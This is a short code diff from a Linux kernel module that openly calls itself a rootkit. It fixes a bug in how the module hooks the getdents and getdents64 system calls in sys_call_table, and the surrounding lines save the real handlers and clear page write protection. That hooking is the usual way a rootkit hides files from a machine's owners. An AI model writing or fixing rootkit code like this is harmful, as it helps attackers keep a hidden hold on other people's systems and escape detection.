@@ -109,7 +109,7 @@ static int __init my_init(void)
 		real_getdents64 = (void *)syscall_table[__NR_getdents64];
 		
 		syscall_table[__NR_getdents] = &new_getdents;
-		syscall_table[__NR_getdents] = &new_getdents64;
+		syscall_table[__NR_getdents64] = &new_getdents64;
 		
 		pte->pte &= ~_PAGE_RW;
 		printk(KERN_EMERG "ROOTKIT sys_call_table hooked\n");
